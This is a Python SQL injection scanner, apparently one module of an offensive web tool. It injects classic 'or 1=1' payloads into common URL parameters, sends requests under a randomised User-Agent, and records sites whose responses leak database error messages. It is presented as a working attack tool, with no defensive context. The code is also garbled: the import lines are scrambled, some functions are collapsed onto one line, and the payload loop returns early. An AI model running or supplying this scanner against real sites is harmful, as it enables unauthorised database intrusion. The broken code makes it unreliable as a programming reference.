import requests from urllib.parse
import re
import urljoin, urlencode from core.utils 
import save_log, random_user_agent

def exploit_sqli(target_url): print("[+] Running SQLi Exploitation...") vulnerable_params = ["id", "cat", "item", "product", "pid", "page"]

exploited = False
for param in vulnerable_params:
    url_with_payload = inject_payload(target_url, param)
    if url_with_payload:
        print(f"[+] Testing: {url_with_payload}")
        try:
            headers = {'User-Agent': random_user_agent()}
            response = requests.get(url_with_payload, headers=headers, timeout=10)
            if is_vulnerable(response.text):
                print(f"[!] Vulnerable URL Found: {url_with_payload}")
                save_log("exploit_sqli", url_with_payload)
                exploited = True
        except Exception as e:
            continue

if not exploited:
    print("[-] No SQLi Vulnerability Found.")

def inject_payload(url, param): if "?" in url and param + "=" in url: payloads = ["1' or '1'='1", "1' or 1=1--", "1') or ('1'='1"] for payload in payloads: injection = urlencode({param: payload}) target = url.split("?")[0] + "?" + injection return target return None

def is_vulnerable(response_text): errors = [ "You have an error in your SQL syntax", "Warning: mysql_", "Unclosed quotation mark after the character string", "quoted string not properly terminated", "SQLSTATE" ] for error in errors: if error.lower() in response_text.lower(): return True return False

